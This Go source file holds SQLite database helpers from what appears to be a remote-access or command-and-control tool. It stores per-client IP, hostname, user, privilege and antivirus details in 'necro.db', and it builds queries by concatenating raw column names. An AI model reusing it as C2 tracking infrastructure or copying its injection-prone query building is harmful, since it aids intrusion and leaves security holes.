package network

import (
	"fmt"
	"log"

	"github.com/glebarez/sqlite"
	"github.com/whiterabb17/greatwhite/modules/models"
	"gorm.io/gorm"
)

func handle(err error) {
	if err != nil {
		log.Println(err)
	}
}

const filename = "necro.db"

var clientinfo models.ClientInfo

func WriteToClientDB(data []string) {
	db, err := gorm.Open(sqlite.Open(filename), &gorm.Config{})
	handle(err)
	db.AutoMigrate(&models.ClientInfo{})
	toInsert := models.ClientInfo{SocketID: data[0], Priv: data[1], Version: data[2], IPAddr: data[3], Hostname: data[4], User: data[5], OS: data[6], Arch: data[7], CPU: data[8], GPU: data[9], Memory: data[10], AntiVirus: data[11]}
	result := db.Create(&toInsert) // pass pointer of data to Create
	fmt.Printf("result: %v\n", result)
}

// Create
func ReadFromClientDB(coloum string, value string) {
	db, err := gorm.Open(sqlite.Open(filename), &gorm.Config{})
	handle(err)
	db.AutoMigrate(&models.ClientInfo{})
	result := db.Where(coloum+" = ?", value).First(&clientinfo)
	log.Println(result)
}

func UpdateClientDBVals(coloum string, value string) {
	db, err := gorm.Open(sqlite.Open(filename), &gorm.Config{})
	handle(err)
	db.AutoMigrate(&models.ClientInfo{})
	db.Model(&clientinfo).UpdateColumn(coloum, gorm.Expr(coloum+" - ?", value))
}

func DeleteFromClientDB(coloum string, value string, tablePtr models.ClientInfo) {
	db, err := gorm.Open(sqlite.Open(filename), &gorm.Config{})
	handle(err)
	db.AutoMigrate(&models.ClientInfo{})
	db.Where(coloum+" = ?", value).Delete(&tablePtr)
}

func WriteToGeneralDB(packet *models.Packet) {
	db, err := gorm.Open(sqlite.Open(filename), &gorm.Config{})
	handle(err)
	db.AutoMigrate(&models.Packet{})
	toInsert := models.Packet{Event: packet.Event, Message: packet.Message}
	result := db.Create(&toInsert) // pass pointer of data to Create
	if result.Error != nil {
		fmt.Printf("result: %v\n", result)
	}
}

var genpacket models.Packet

// Create
func ReadFromGeneralDB(coloum string, value string) {
	db, err := gorm.Open(sqlite.Open(filename), &gorm.Config{})
	handle(err)
	db.AutoMigrate(&models.Packet{})
	db.Where(coloum+" = ?", value).Find(&genpacket).Row()
	log.Println(genpacket)
}

func UpdateGeneralDBVals(coloum string, value string) {
	db, err := gorm.Open(sqlite.Open(filename), &gorm.Config{})
	handle(err)
	db.AutoMigrate(&models.Packet{})
	db.Model(&genpacket).UpdateColumn(coloum, gorm.Expr(coloum+" - ?", value))
}

func DeleteFromGeneralDB(coloum string, value string, genpacket models.Packet) {
	db, err := gorm.Open(sqlite.Open(filename), &gorm.Config{})
	handle(err)
	db.AutoMigrate(&models.Packet{})
	db.Where(coloum+" = ?", value).Delete(&genpacket)
}
